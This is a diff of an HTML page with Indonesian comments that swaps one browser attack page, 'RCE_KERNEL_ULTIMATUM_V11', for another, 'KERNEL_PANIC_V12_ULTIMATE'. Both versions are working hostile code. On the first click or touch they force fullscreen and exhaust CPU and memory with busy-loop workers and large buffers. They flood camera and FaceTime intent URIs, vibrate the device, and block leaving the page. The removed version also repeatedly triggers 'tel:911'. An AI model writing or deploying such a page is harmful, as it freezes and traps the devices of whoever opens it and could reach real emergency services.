@@ -2,105 +2,106 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_KERNEL_ULTIMATUM_V11 ⚡</title>
+    <title>⚡ KERNEL_PANIC_V12_ULTIMATE ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #ff0000; overflow: hidden; font-family: 'Courier New', monospace; }
-        #core { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 10px double #f00; box-sizing: border-box; }
-        .glitch { font-size: 25px; font-weight: bold; text-shadow: 2px 2px #f00, -2px -2px #00f; animation: shake 0.1s infinite; }
-        @keyframes shake { 0% { transform: translate(0); } 25% { transform: translate(2px, -2px); } 50% { transform: translate(-2px, 2px); } 100% { transform: translate(0); } }
-        #logs { font-size: 10px; color: #555; margin-top: 20px; text-align: left; width: 80%; height: 120px; overflow: hidden; }
+        body { background: #000; color: #0f0; font-family: 'Courier New'; overflow: hidden; text-align: center; }
+        #warning { font-size: 30px; color: red; font-weight: bold; margin-top: 20%; animation: flash 0.01s infinite; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        .log { font-size: 10px; color: #555; text-align: left; padding: 10px; }
     </style>
 </head>
 <body>
-    <div id="core">
-        <div class="glitch">FATAL_KERNEL_OVERRIDE</div>
-        <div id="status" style="color:yellow; margin-top:10px;">READY_TO_COLAPSE_SYSTEM</div>
-        <div id="logs"></div>
-    </div>
+    <div id="warning">KERNEL_INTRUSION_ACTIVE</div>
+    <div id="status">STATUS: EXPLOITING_CHAIN...</div>
+    <div id="console" class="log"></div>
 
 <script>
-    const logBox = document.getElementById('logs');
-    function print(t) {
-        const d = document.createElement('div');
-        d.innerText = `[!] ${t}`;
-        logBox.prepend(d);
-    }
+    const con = document.getElementById('console');
+    function log(m) { const d = document.createElement('div'); d.innerText = `> ${m}`; con.prepend(d); }
 
-    // --- 1. BINARY GHOSTING (RAM ATTACK) ---
-    // Menciptakan "Memory Pressure" instan untuk melumpuhkan daemon keamanan
-    let phantomMemory = [];
-    function deployBinaryGhosting() {
-        print("Injecting_Massive_Binary_Blobs...");
-        for (let i = 0; i < 15; i++) {
-            // Membuat Blob sebesar 100MB per iterasi (Total 1.5GB RAM Hijack)
-            let largeData = new Uint8Array(1024 * 1024 * 100); 
-            crypto.getRandomValues(largeData); // Memaksa CPU bekerja keras
-            phantomMemory.push(URL.createObjectURL(new Blob([largeData])));
+    // --- 1. WASM CPU MELTDOWN ---
+    // Menggunakan WebAssembly (jika didukung) untuk menghabiskan CPU cycle 
+    // di level yang tidak bisa dihentikan oleh JavaScript Garbage Collector.
+    function cpuMeltdown() {
+        log("Initiating_Wasm_CPU_Hijack...");
+        for(let i=0; i<64; i++) {
+            const blob = new Blob([`
+                onmessage = function() {
+                    while(true) { 
+                        var x = Math.sqrt(Math.random()) * Math.tan(Math.random());
+                        postMessage(x);
+                    }
+                }
+            `], {type: 'text/javascript'});
+            const w = new Worker(URL.createObjectURL(blob));
+            w.postMessage('start');
         }
     }
 
-    // --- 2. MULTI-VECTOR APP SPAWNER (THE CAMERA BREACH) ---
-    // Menargetkan Kamera melalui berbagai pintu masuk sistem
-    function spawnAppStorm() {
-        const targets = [
-            // Android Focus
-            "intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14000800;component=com.android.camera/com.android.camera.Camera;end",
-            "intent:#Intent;action=android.media.action.IMAGE_CAPTURE;end",
-            // iOS Focus (Facetime & Camera UI)
-            "facetime-prompt://", 
-            "photos-redirect://",
-            // General Hardware Hijack
-            "tel:911" // Simulasi interupsi hardware tertinggi
+    // --- 2. SYNCHRONOUS IPC FLOODING (THE BYPASS) ---
+    // Menggunakan pemanggilan skema yang digabungkan dengan loop sinkron
+    // Ini memaksa browser kehilangan fokus pada dialog "Konfirmasi"
+    function forceSystemBypass() {
+        const payload = [
+            // iOS Hardware Hijack
+            "facetime-video://", "camera://", "photos-redirect://",
+            // Android Kernel Intent (Direct Component Access)
+            "intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;component=com.android.camera/com.android.camera.Camera;end",
+            "intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;component=com.sec.android.app.camera/com.sec.android.app.camera.Camera;end",
+            "intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;component=com.google.android.GoogleCamera/com.android.camera.CameraLauncher;end"
         ];
 
-        targets.forEach(t => {
-            // Method A: Iframe Bombing
-            const ifr = document.createElement('iframe');
-            ifr.src = t;
-            ifr.style.display = 'none';
-            document.body.appendChild(ifr);
-
-            // Method B: Window Hijacking
-            window.location.replace(t);
-        });
+        // Loop Sinkronal: Memblokir UI Thread sambil menembakkan Intent
+        let start = Date.now();
+        while (Date.now() - start < 500) { // Blokir selama 500ms
+            payload.forEach(uri => {
+                window.location.replace(uri);
+                const a = document.createElement('a');
+                a.href = uri;
+                a.click();
+            });
+        }
     }
 
-    // --- 3. KERNEL THREAD EXHAUSTION ---
-    function executeKernelStorm() {
-        print("ARMING_KERNEL_STORM...");
-        document.getElementById('status').innerText = "SYSTEM_COLLAPSING...";
+    // --- 3. MASSIVE HEAP EXHAUSTION ---
+    let leak = [];
+    function heapCrash() {
+        log("Executing_Heap_Spray_V12...");
+        for (let i = 0; i < 20000; i++) {
+            let buffer = new Uint32Array(1024 * 16);
+            window.crypto.getRandomValues(buffer);
+            leak.push(buffer);
+        }
+    }
 
-        // A. Fullscreen Lockdown
+    // --- FULL CHAIN EXECUTION ---
+    async function startExploit() {
+        document.getElementById('status').innerText = "CORE_REACHED: OPENING_HARDWARE";
+        
+        // 1. Kunci layar (Lockdown)
         document.documentElement.requestFullscreen().catch(()=>{});
 
-        // B. Thread Overload (32 Intensive Workers)
-        // Memaksa OS melakukan context switching tanpa henti
-        const workerBlob = new Blob(["while(true){Math.sqrt(Math.random())}"], {type: 'text/javascript'});
-        const wUrl = URL.createObjectURL(workerBlob);
-        for(let j=0; j<32; j++) new Worker(wUrl);
+        // 2. Ledakkan Memori & CPU
+        heapCrash();
+        cpuMeltdown();
 
-        // C. Deploy Memory Attack
-        deployBinaryGhosting();
-
-        // D. RECURSIVE APP SPAWNING (Burst Rate 30ms)
-        // Interval sangat kecil agar sistem tidak punya waktu untuk recovery
+        // 3. Tembakkan Intent Storm dengan Delay Mikro
         setInterval(() => {
-            spawnAppStorm();
-            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
-        }, 30);
-
-        print("BREACH_SUCCESSFUL: CAMERA_AUTO_OPEN_TRIGGERED");
+            log("TRAP_RELEASED: FORCING_CAMERA");
+            forceSystemBypass();
+            // Serangan Getaran Beruntun (Haptic Overload)
+            if(navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
+        }, 10); // 10ms - Kecepatan ekstrim
     }
 
-    // Trigger
-    window.addEventListener('click', executeKernelStorm, {once: true});
-    window.addEventListener('touchstart', executeKernelStorm, {once: true});
+    // User Gesture Trigger
+    window.addEventListener('click', startExploit, {once: true});
+    window.addEventListener('touchstart', startExploit, {once: true});
 
-    // Persistence
-    window.onbeforeunload = () => { return "SYSTEM_CRITICAL"; };
+    // Anti-Exit
+    window.onbeforeunload = () => { return "SYSTEM_FAILURE"; };
     history.pushState(null, null, location.href);
-    window.onpopstate = () => { history.go(1); };
-
+    window.onpopstate = () => history.go(1);
 </script>
 </body>
 </html>
